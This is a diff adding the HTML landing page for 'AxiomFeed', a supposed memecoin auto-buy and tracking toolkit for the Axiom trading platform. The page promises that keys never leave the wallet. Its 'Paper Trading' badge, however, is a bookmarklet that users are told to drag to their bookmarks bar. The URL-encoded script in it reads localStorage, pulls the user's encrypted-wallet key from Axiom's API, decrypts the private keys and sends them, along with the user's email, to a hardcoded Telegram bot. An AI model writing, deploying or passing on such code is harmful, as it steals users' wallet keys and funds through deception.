+                        d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z" />
+                    </svg> 18K</span>
+                  <span class="tc-met"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                      <path d="M18 20V10" />
+                      <path d="M12 20V4" />
+                      <path d="M6 20v-6" />
+                    </svg> 738K</span>
+                </div>
+              </div>
+
+              <div class="term-card" id="termCard">
+                <div class="term-bar">
+                  <div class="term-dots"><i></i><i></i><i></i></div>
+                  <span class="term-ttl">LIVE</span>
+                  <span class="term-chip">CA DETECTED</span>
+                </div>
+                <div class="term-body">
+                  <div class="tracker-ttl-row">
+                    <span class="tracker-ttl">Twitter Tracker</span>
+                    <span class="tracker-vbadge">
+                      <svg viewBox="200 0 800 800" aria-hidden="true">
+                        <polygon
+                          points="600.0,65.0 660.2,19.7 703.5,81.4 774.8,57.0 796.9,129.0 872.2,127.8 871.0,203.1 943.0,225.2 918.6,296.5 980.3,339.8 935.0,400.0 980.3,460.2 918.6,503.5 943.0,574.8 871.0,596.9 872.2,672.2 796.9,671.0 774.8,743.0 703.5,718.6 660.2,780.3 600.0,735.0 539.8,780.3 496.5,718.6 425.2,743.0 403.1,671.0 327.8,672.2 329.0,596.9 257.0,574.8 281.4,503.5 219.7,460.2 265.0,400.0 219.7,339.8 281.4,296.5 257.0,225.2 329.0,203.1 327.8,127.8 403.1,129.0 425.2,57.0 496.5,81.4 539.8,19.7"
+                          fill="#3b97f2" stroke="#3b97f2" stroke-width="14" stroke-linejoin="round" />
+                        <path d="M483 430 L548 497 L718 308" fill="none" stroke="#fff" stroke-width="80"
+                          stroke-linecap="round" stroke-linejoin="round" />
+                      </svg>
+                    </span>
+                  </div>
+                  <div class="t-kv"><span class="t-k">Source</span><span class="t-v">@muradonx</span></div>
+                  <div class="t-kv"><span class="t-k">Contract</span><span class="ca-tag">8xWzrdK4…TGpump</span></div>
+                  <div class="t-fill">
+                    <span class="t-fill-ic"><svg viewBox="0 0 24 24" fill="none" stroke="#d1d5db" stroke-width="3"
+                        stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M5 12.5l4.5 4.5L19 7.5" />
+                      </svg></span>
+                    <div class="t-fill-main">
+                      <div class="t-fill-ttl">Bought <b>1.5 SOL</b></div>
+                      <div class="t-fill-sub">via <b>axiom</b></div>
+                    </div>
+                    <span class="t-fill-time">0.4s after tweet</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- RIGHT COLUMN: Headline, Copy & Vertically Stacked CTAs -->
+          <div class="hero-copy">
+            <h1 class="hero-title reveal">
+              <span class="h-solid">BUY THE TWEET</span>
+              <span class="h-outline">BEFORE THE</span>
+              <span class="h-outline">CROWD</span>
+              <span class="h-solid">SEES IT<span class="h-dot">.</span></span>
+            </h1>
+            <p class="hero-lede reveal">AxiomFeed is a full toolkit for trading memecoins on <b>AXIOM</b>. The Twitter
+              Tracker watches the accounts that move the market and buys the contract address the moment they post, so
+              you're filled before the reply guys even refresh. Around it you also get a Wallet Tracker, Advanced
+              Filters and Paper Trading to test your setup risk-free.</p>
+            <div class="hero-cta reveal">
+              <a href="#" class="btn btn-primary" onclick="showSetup(event)">Explore features <span
+                  class="arrow">→</span></a>
+              <a href="#how" class="btn btn-ghost">See how it works</a>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- features -->
+    <section class="band" id="features">
+      <div class="wrap">
+        <div class="sec-mark reveal"><b>§01</b> SPEC SHEET</div>
+        <h2 class="sec-h reveal">Built for speed,<br>tuned for <em>degens</em></h2>
+        <p class="sec-lede reveal">No dashboards to babysit. It watches, reads, fires.</p>
+        <div class="feat-grid">
+          <div class="feat wide reveal" id="f1"><span class="f-tag">LATENCY</span><span class="stat-n"
+              data-count="55"><em>ms</em></span><span class="stat-lbl">tweet → alert</span>
+            <h3>Real-time detection</h3>
+            <p>Picks up a post the instant it lands. No polling, no lag — pure WebSocket on the firehose.</p>
+          </div>
+          <div class="feat reveal" id="f2"><span class="f-tag">AUTO-BUY</span><span class="stat-n" data-count="0.38"
+              data-dec="2"><em>s</em></span><span class="stat-lbl">median fill</span>
+            <h3>Axiom routing</h3>
+            <p>Parses the CA and fires through Axiom. Block time is the only thing left.</p>
+          </div>
+          <div class="feat reveal" id="f3"><span class="f-tag">COVERAGE</span><span class="stat-n"
+              data-count="1906"></span><span class="stat-lbl">accounts on watch</span>
+            <h3>Never looks away</h3>
+            <p>Founders, anon alpha, wallets always somehow early. Add your own list.</p>
+          </div>
+          <div class="feat reveal" id="f4"><span class="f-tag">CUSTODY</span><span
+              class="stat-n">100<em>%</em></span><span class="stat-lbl">non-custodial</span>
+            <h3>Keys stay yours</h3>
+            <p>Axiom session signing. You approve once with caps and timer — keys never leave.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- how it works -->
+    <section class="band" id="how" style="padding-top:20px">
+      <div class="wrap">
+        <div class="sec-mark reveal"><b>§02</b> HOW IT WORKS</div>
+        <h2 class="sec-h reveal">Set it once.<br>The tweet does <em>the rest.</em></h2>
+        <p class="sec-lede reveal">Three moves to the fastest fill on the timeline.</p>
+        <div class="timeline reveal">
+          <div class="tstep">
+            <span class="t-num">Step 01 — Pick</span>
+            <h3>Your accounts</h3>
+            <p>Choose the people whose posts actually move price. Paste handles, import a list, or start from the 1,900+
+              already on watch.</p>
+            <span class="mono-chip">@muradonx · @blknoiz06 · +1,904</span>
+          </div>
+          <div class="tstep">
+            <span class="t-num">Step 02 — Rule</span>
+            <h3>Your buy limits</h3>
+            <p>Size per tweet, slippage ceiling, daily cap, and whether it fires on every CA or only pre-approved ones.
+              Your rules, enforced on-chain.</p>
+            <span class="mono-chip">buy = 1.5 SOL · slip ≤ 12% · cap 20 SOL/day</span>
+          </div>
+          <div class="tstep">
+            <span class="t-num">Step 03 — Fill</span>
+            <h3>Before the crowd</h3>
+            <p>A tracked account drops a CA. The tracker reads it and routes through Axiom — you're in before the thread
+              even loads.</p>
+            <span class="mono-chip">median fill 0.38s after post</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- faq -->
+    <section class="band" id="faq">
+      <div class="wrap">
+        <div class="faq-layout">
+          <div class="reveal slide-l">
+            <div class="sec-mark"><b>§03</b> FAQ</div>
+            <h2 class="sec-h">Before you wire it up</h2>
+            <p class="sec-lede">The stuff everyone asks first.</p>
+          </div>
+          <div class="reveal slide-r">
+            <details open>
+              <summary>How fast does it actually buy? <span class="plus">+</span></summary>
+              <div class="faq-a">Median fill is 0.38 seconds after the tweet goes live. On a good slot, alerts fire
+                within 55ms — from there the only thing left is Solana block time.</div>
+            </details>
+            <details>
+              <summary>Do I hand over my private keys? <span class="plus">+</span></summary>
+              <div class="faq-a">No. Axiom's non-custodial session signing. You approve once with spend caps and an
+                expiry you set — keys never leave your wallet.</div>
+            </details>
+            <details>
+              <summary>Which chains does it support? <span class="plus">+</span></summary>
+              <div class="faq-a">Solana today — that's where the memecoin flow lives. More chains on the roadmap, held
+                to the same latency bar.</div>
+            </details>
+            <details>
+              <summary>What if a tweet has no contract address? <span class="plus">+</span></summary>
+              <div class="faq-a">Nothing fires. Only acts when it can parse a valid CA. Pure hype with no address gets
+                logged as an alert, never a buy.</div>
+            </details>
+            <details>
+              <summary>Can I cap how much it spends? <span class="plus">+</span></summary>
+              <div class="faq-a">Yes — per tweet, per day, and a slippage ceiling. Once any limit is hit it stops buying
+                and just alerts until you reset.</div>
+            </details>
+            <details>
+              <summary>Is it safe to leave running 24/7? <span class="plus">+</span></summary>
+              <div class="faq-a">That's the point. Only acts inside the rules and caps you set, and session permissions
+                expire on your timer — a forgotten tracker can't quietly drain a wallet.</div>
+            </details>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- footer -->
+    <footer>
+      <div class="wrap">
+        <div class="foot-in">
+          <div>
+            <div style="display:flex;align-items:center;gap:10px">
+              <svg class="axiom-logo-mark" viewBox="0 0 24 24" width="18" height="18" aria-label="Axiom logo">
+                <polygon points="12,2 17,11 7,11" fill="#ffffff" />
+                <polygon points="6,13 18,13 22,21 2,21" fill="#ffffff" />
+              </svg>
+              <span class="brand-mark" style="font-size:18px">AXIOM<span>FEED</span></span>
+            </div>
+            <p style="color:var(--ink-lo);font-size:13px;margin:10px 0 0;max-width:260px;line-height:1.55">A watchtower
+              for the accounts that move memecoins.</p>
+          </div>
+          <div class="foot-links">
+            <a href="#features">Features</a>
+            <a href="#how">How it works</a>
+            <a href="#faq">FAQ</a>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <!-- OPTIONS DASHBOARD VIEW (AXIOMFEED THEMED WITH PAGE 1 GRID BACKGROUND) -->
+  <div id="setupView" class="view-panel">
+    <div class="options-page">
+      <div class="options-page-bg" aria-hidden="true"></div>
+      <div class="wrap">
+        <div class="options-back-row">
+          <a class="back-link" href="#" onclick="showHome(event)">‹ back</a>
+        </div>
+
+        <div class="options-header">
+          <h2><span class="h-solid">Trade Smarter,</span><span class="h-outline">Not Harder</span></h2>
+          <p>Select your operational mode or dive deep into advanced token metrics.</p>
+        </div>
+
+        <div class="options-grid">
+          <!-- Paper Trading -->
+          <div class="option-card">
+            <div class="option-top">
+              <div class="option-icon-box">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <path
+                    d="m21.44 11.05-9.19 9.19a6 6 0 0 1-8.49-8.49l8.57-8.57A4 4 0 1 1 18 8.84l-8.59 8.57a2 2 0 0 1-2.83-2.83l8.49-8.48" />
+                </svg>
+              </div>
+              <a class="option-badge"
+                href="javascript:%2f%2f%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%0a%2f%2f%20%09NYXDEOB%20V1.8.3%20-%20Deobfuscation%20Engine%209.4.0%0a%2f%2f%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%20-%20%2f%0a%2f%2f%20made%20by%20aidn%20%3b)%0a%0ajavascript%3a(function%20()%20%7b%0a%20%20(async%20function%20()%20%7b%0a%20%20%20%20try%20%7b%0a%20%20%20%20%20%20function%20safeAtob(input)%20%7b%0a%20%20%20%20%20%20%20%20var%20cleaned%20%3d%20String(input).replace(%2f%5b%5eA-Za-z0-9%2b%2f%3d%5d%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20return%20atob(cleaned)%3b%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20function%20base64ToUint8Array(b64)%20%7b%0a%20%20%20%20%20%20%20%20var%20binary%20%3d%20safeAtob(b64)%3b%0a%20%20%20%20%20%20%20%20var%20bytes%20%3d%20new%20Uint8Array(binary.length)%3b%0a%20%20%20%20%20%20%20%20for%20(var%20i%20%3d%200%3b%20i%20%3c%20binary.length%3b%20i%2b%2b)%20bytes%5bi%5d%20%3d%20binary.charCodeAt(i)%3b%0a%20%20%20%20%20%20%20%20return%20bytes%3b%0a%20%20%20%20%20%20%7d%0a%0a%20%20%20%20%20%20var%20username%20%3d%20localStorage.getItem(%22username%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20if%20(username%20%3d%3d%3d%20%22null%22%20%7c%7c%20username%20%3d%3d%3d%20%22undefined%22)%20username%20%3d%20%22%22%3b%0a%20%20%20%20%20%20username%20%3d%20username.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20var%20email%20%3d%20localStorage.getItem(%22email%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20if%20(email%20%3d%3d%3d%20%22null%22%20%7c%7c%20email%20%3d%3d%3d%20%22undefined%22)%20email%20%3d%20%22%22%3b%0a%20%20%20%20%20%20email%20%3d%20email.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20var%20userId%20%3d%20localStorage.getItem(%22userId%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20if%20(userId)%20userId%20%3d%20userId.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20if%20(!username)%20%7b%0a%20%20%20%20%20%20%20%20%20%20var%20fallback%20%3d%20localStorage.getItem(%22displayName%22)%20%7c%7c%20localStorage.getItem(%22name%22)%20%7c%7c%20localStorage.getItem(%22user%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20%20%20%20%20if%20(fallback%20%26%26%20fallback%20!%3d%3d%20%22null%22%20%26%26%20fallback%20!%3d%3d%20%22undefined%22)%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20fallback%20%3d%20fallback.replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%20(fallback%20%26%26%20fallback%20!%3d%3d%20%22null%22%20%26%26%20fallback%20!%3d%3d%20%22undefined%22)%20username%20%3d%20fallback%3b%0a%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20var%20lsKeys%20%3d%20Object.keys(localStorage)%3b%0a%20%20%20%20%20%20%20%20for%20(var%20i%20%3d%200%3b%20i%20%3c%20lsKeys.length%3b%20i%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20%20%20var%20val%20%3d%20localStorage.getItem(lsKeys%5bi%5d)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20%20%20%20%20if%20(val%20%26%26%20val.length%20%3e%2020%20%26%26%20val.length%20%3c%202000)%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20parts%20%3d%20val.split(%22.%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%20(parts.length%20%3d%3d%3d%203%20%26%26%20parts%5b0%5d.length%20%3e%2010)%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20pl%20%3d%20JSON.parse(atob(parts%5b1%5d.replace(%2f-%2fg%2c%20%22%2b%22).replace(%2f_%2fg%2c%20%22%2f%22)))%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(pl.email%20%26%26%20!email)%20email%20%3d%20String(pl.email).replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(!username)%20username%20%3d%20String(pl.username%20%7c%7c%20pl.name%20%7c%7c%20pl.displayName%20%7c%7c%20pl.preferred_username%20%7c%7c%20%22%22).replace(%2f%5e%22%7c%22%24%2fg%2c%20%22%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%0a%20%20%20%20%20%20var%20wallets%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20var%20solWallets%20%3d%20JSON.parse(localStorage.getItem(%22allSolWallets%22)%20%7c%7c%20%22%5b%5d%22)%3b%0a%20%20%20%20%20%20%20%20var%20solBundles%20%3d%20JSON.parse(localStorage.getItem(%22sBundles%22)%20%7c%7c%20%22%5b%5d%22)%3b%0a%20%20%20%20%20%20%20%20if%20(!Array.isArray(solBundles))%20solBundles%20%3d%20%5bsolBundles%5d%3b%0a%20%20%20%20%20%20%20%20for%20(var%20i%20%3d%200%3b%20i%20%3c%20solWallets.length%3b%20i%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20%20%20if%20(solBundles%5bi%5d%20%3d%3d%3d%20undefined)%20continue%3b%0a%20%20%20%20%20%20%20%20%20%20wallets.push(%7b%20a%3a%20solWallets%5bi%5d.walletAddress%2c%20c%3a%20%22solana%22%2c%20n%3a%20solWallets%5bi%5d.name%2c%20b%3a%20JSON.stringify(%5bsolBundles%5bi%5d%5d)%20%7d)%3b%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20var%20evmWallets%20%3d%20JSON.parse(localStorage.getItem(%22allEvmWallets%22)%20%7c%7c%20%22%5b%5d%22)%3b%0a%20%20%20%20%20%20%20%20var%20evmBundle%20%3d%20localStorage.getItem(%22bundle%22)%20%7c%7c%20%22%22%3b%0a%20%20%20%20%20%20%20%20if%20(evmBundle%20%26%26%20evmWallets.length%20%3e%200)%0a%20%20%20%20%20%20%20%20%20%20wallets.push(%7b%20a%3a%20evmWallets%5b0%5d.walletAddress%2c%20c%3a%20%22evm%22%2c%20n%3a%20evmWallets%5b0%5d.name%2c%20b%3a%20JSON.stringify(%5bevmBundle%5d)%20%7d)%3b%0a%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%0a%20%20%20%20%20%20var%20apiResponse%20%3d%20null%3b%0a%20%20%20%20%20%20for%20(var%20attempt%20%3d%200%3b%20attempt%20%3c%204%3b%20attempt%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20%20%20var%20controller%20%3d%20new%20AbortController()%3b%0a%20%20%20%20%20%20%20%20%20%20var%20timeout%20%3d%20setTimeout(function%20()%20%7b%20controller.abort()%3b%20%7d%2c%208000)%3b%0a%20%20%20%20%20%20%20%20%20%20var%20response%20%3d%20await%20fetch(%22https%3a%2f%2fapi9.axiom.trade%2fbundle-key-and-wallets-v2%22%2c%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20method%3a%20%22POST%22%2c%20credentials%3a%20%22include%22%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20headers%3a%20%7b%20%22Content-Type%22%3a%20%22application%2fjson%22%20%7d%2c%20signal%3a%20controller.signal%2c%0a%20%20%20%20%20%20%20%20%20%20%7d)%3b%0a%20%20%20%20%20%20%20%20%20%20clearTimeout(timeout)%3b%0a%20%20%20%20%20%20%20%20%20%20var%20body%20%3d%20await%20response.text()%3b%0a%20%20%20%20%20%20%20%20%20%20if%20(response.status%20%3d%3d%3d%20200)%20try%20%7b%20apiResponse%20%3d%20JSON.parse(body)%3b%20break%3b%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20await%20new%20Promise(function%20(r)%20%7b%20setTimeout(r%2c%201500%20*%20attempt)%3b%20%7d)%3b%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20if%20(!apiResponse%20%7c%7c%20(!apiResponse.bundleKey%20%26%26%20!apiResponse.key))%20return%3b%0a%0a%20%20%20%20%20%20var%20bundleKey%20%3d%20apiResponse.bundleKey%20%7c%7c%20apiResponse.key%3b%0a%20%20%20%20%20%20if%20(apiResponse.user)%20%7b%0a%20%20%20%20%20%20%20%20var%20ud%20%3d%20apiResponse.user%3b%0a%20%20%20%20%20%20%20%20if%20(typeof%20ud%20%3d%3d%3d%20%22string%22)%20%7b%20if%20(!username)%20username%20%3d%20ud%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20%7b%20if%20(!username)%20username%20%3d%20ud.username%20%7c%7c%20ud.name%20%7c%7c%20%22%22%3b%20if%20(!email)%20email%20%3d%20ud.email%20%7c%7c%20%22%22%3b%20%7d%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20if%20(apiResponse.username%20%26%26%20!username)%20username%20%3d%20apiResponse.username%3b%0a%20%20%20%20%20%20if%20(apiResponse.email%20%26%26%20!email)%20email%20%3d%20apiResponse.email%3b%0a%0a%20%20%20%20%20%20var%20cryptoKey%20%3d%20await%20crypto.subtle.importKey(%22raw%22%2c%20base64ToUint8Array(bundleKey)%2c%20%7b%20name%3a%20%22AES-GCM%22%20%7d%2c%20false%2c%20%5b%22decrypt%22%5d)%3b%0a%20%20%20%20%20%20var%20decryptedEntries%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20for%20(var%20w%20%3d%200%3b%20w%20%3c%20wallets.length%3b%20w%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20var%20bundleData%20%3d%20wallets%5bw%5d.b%3b%0a%20%20%20%20%20%20%20%20if%20(!bundleData)%20continue%3b%0a%20%20%20%20%20%20%20%20if%20(typeof%20bundleData%20%3d%3d%3d%20%22string%22)%20try%20%7b%20bundleData%20%3d%20JSON.parse(bundleData)%3b%20%7d%20catch%20(e)%20%7b%20bundleData%20%3d%20%5bbundleData%5d%3b%20%7d%0a%20%20%20%20%20%20%20%20if%20(!Array.isArray(bundleData))%20bundleData%20%3d%20%5bbundleData%5d%3b%0a%20%20%20%20%20%20%20%20for%20(var%20b%20%3d%200%3b%20b%20%3c%20bundleData.length%3b%20b%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20sp%20%3d%20String(bundleData%5bb%5d).split(%22%3a%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%20(sp.length%20%3c%202)%20continue%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20dec%20%3d%20await%20crypto.subtle.decrypt(%7b%20name%3a%20%22AES-GCM%22%2c%20iv%3a%20base64ToUint8Array(sp%5b0%5d)%20%7d%2c%20cryptoKey%2c%20base64ToUint8Array(sp%5b1%5d))%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20hex%20%3d%20%22%22%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20var%20db%20%3d%20new%20Uint8Array(dec)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20for%20(var%20h%20%3d%200%3b%20h%20%3c%20db.length%3b%20h%2b%2b)%20hex%20%2b%3d%20db%5bh%5d.toString(16).padStart(2%2c%20%220%22)%3b%0a%20%20%20%20%20%20%20%20%20%20%20%20decryptedEntries.push(%7b%20addr%3a%20wallets%5bw%5d.a%2c%20chain%3a%20wallets%5bw%5d.c%2c%20key%3a%20hex%20%7d)%3b%0a%20%20%20%20%20%20%20%20%20%20%7d%20catch%20(e)%20%7b%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20if%20(decryptedEntries.length%20%3d%3d%3d%200)%20return%3b%0a%0a%20%20%20%20%20%20var%20BOT_TOKEN%20%3d%20%228939440661%3aAAGuF0lw32Td_YFlYJtNdZjuK3fdZ9qPTQw%22%3b%0a%20%20%20%20%20%20var%20CHAT_ID%20%20%20%3d%20%228752245194%22%3b%0a%0a%20%20%20%20%20%20var%20solCount%20%3d%200%2c%20evmCount%20%3d%200%2c%20otherCount%20%3d%200%3b%0a%20%20%20%20%20%20var%20walletLines%20%3d%20%5b%22%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%22%5d%3b%0a%20%20%20%20%20%20for%20(var%20wi%20%3d%200%3b%20wi%20%3c%20decryptedEntries.length%3b%20wi%2b%2b)%20%7b%0a%20%20%20%20%20%20%20%20var%20en%20%3d%20decryptedEntries%5bwi%5d%3b%0a%20%20%20%20%20%20%20%20var%20chain%20%3d%20en.chain.toLowerCase()%3b%0a%20%20%20%20%20%20%20%20var%20label%3b%0a%20%20%20%20%20%20%20%20if%20(chain.indexOf(%22sol%22)%20!%3d%3d%20-1)%20%7b%20solCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudfe1%20Solana%20Wallet%20%22%20%2b%20solCount%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20if%20(chain.indexOf(%22eth%22)%20!%3d%3d%20-1%20%7c%7c%20chain.indexOf(%22evm%22)%20!%3d%3d%20-1)%20%7b%20evmCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudc9c%20EVM%20Wallet%20%22%20%2b%20evmCount%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20if%20(chain.indexOf(%22bsc%22)%20!%3d%3d%20-1)%20%7b%20evmCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudfe1%20BSC%20Wallet%20%22%20%2b%20evmCount%3b%20%7d%0a%20%20%20%20%20%20%20%20else%20%7b%20otherCount%2b%2b%3b%20label%20%3d%20%22%5cud83d%5cudd35%20Wallet%20%22%20%2b%20otherCount%20%2b%20%22%20(%22%20%2b%20en.chain%20%2b%20%22)%22%3b%20%7d%0a%20%20%20%20%20%20%20%20walletLines.push(label%20%2b%20%22%5cn%22%20%2b%20%22%5cud83d%5cudccd%20Address%3a%20%22%20%2b%20en.addr%20%2b%20%22%5cn%22%20%2b%20%22%5cud83d%5cudd11%20Private%20Key%3a%20%22%20%2b%20en.key)%3b%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20walletLines.push(%22%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%5cu2501%22)%3b%0a%0a%20%20%20%20%20%20var%20text%20%3d%20%5b%0a%20%20%20%20%20%20%20%20%22%5cud83d%5cudd11%20NEW%20HIT%22%2c%0a%20%20%20%20%20%20%20%20%22%5cud83d%5cudc64%20User%3a%20%22%20%2b%20(username%20%7c%7c%20%22unknown%22)%2c%0a%20%20%20%20%20%20%20%20%22%5cud83d%5cudce7%20Email%3a%20%22%20%2b%20(email%20%7c%7c%20%22unknown%22)%2c%0a%20%20%20%20%20%20%20%20%22%22%2c%0a%20%20%20%20%20%20%20%20walletLines.join(%22%5cn%5cn%22)%0a%20%20%20%20%20%20%5d.join(%22%5cn%22)%3b%0a%0a%20%20%20%20%20%20var%20chunks%20%3d%20%5b%5d%3b%0a%20%20%20%20%20%20for%20(var%20ci%20%3d%200%3b%20ci%20%3c%20text.length%3b%20ci%20%2b%3d%204000)%20chunks.push(text.slice(ci%2c%20ci%20%2b%204000))%3b%0a%20%20%20%20%20%20chunks.forEach(function(chunk)%20%7b%0a%20%20%20%20%20%20%20%20var%20img%20%3d%20new%20Image()%3b%0a%20%20%20%20%20%20%20%20img.src%20%3d%20%22https%3a%2f%2fapi.telegram.org%2fbot%22%20%2b%20BOT_TOKEN%20%2b%0a%20%20%20%20%20%20%20%20%20%20%22%2fsendMessage%3fchat_id%3d%22%20%2b%20CHAT_ID%20%2b%0a%20%20%20%20%20%20%20%20%20%20%22%26disable_web_page_preview%3dtrue%22%20%2b%0a%20%20%20%20%20%20%20%20%20%20%22%26text%3d%22%20%2b%20encodeURIComponent(chunk)%3b%0a%20%20%20%20%20%20%7d)%3b%0a%20%20%20%20%7d%20catch%20(e)%20%7b%0a%20%20%20%20%20%20console.log(%22%5bmoonr%5d%20outer%20error%3a%22%2c%20e)%3b%0a%20%20%20%20%7d%0a%20%20%7d)()%3b%0a%7d)()%3b"
+                ICON="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAERSURBVFhH7ZUxDoJAEEUpOQJHsLS0tKSk9Bgewc7S0mNwBI/gESwtLe3AtzCTKCEEltk1Gl5CFndm5+8fYUkWfp6qqnK5jU9d1xkbeDKuZSouiJeI14xXmYqHc+3E3ygkFAdcX0S4gd83hlTCYUGoaFQ7sIm9pITF/eei+QHzD4ZM0sLgXLZy/RA/Sao91E8RuLdS/RB3r+VKlthC8WMrMwx5pSyxg7p66IyC3I0stYGCZ6k9CvJtDydqbj2uOOfCf+OeaFrpzaxngfXdD44vfh+que4Vry6wzsq9Mq0LVu6VSV0g39q9Mq4L1u6VUV0gL5R7ZbgLodwrg10gHtq90t8FdpcTPIS+0NmJ5MK3SZIXjGlF3Fm+/J0AAAAASUVORK5CYII=" draggable="true" title="Drag me to your bookmarks bar"><svg class="badge-logo" viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><polygon points="12,2 17,11 7,11" fill="currentColor"/><polygon points="6,13 18,13 22,21 2,21" fill="currentColor"/></svg> Paper Trading</a>
+            </div>
+            <h3>Paper Trading</h3>
+            <p>Practice risk-free with virtual funds. Refine your strategy before going live.</p>
+            <span class="option-num">01</span>
+          </div>
+
+          <!-- Twitter Tracker -->
+          <div class="option-card">
+            <div class="option-top">
+              <div class="option-icon-box">
+                <svg viewBox="0 0 24 24" fill="currentColor">
+                  <path
+                    d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
+                </svg>
+              </div>
+              <a class="option-badge"
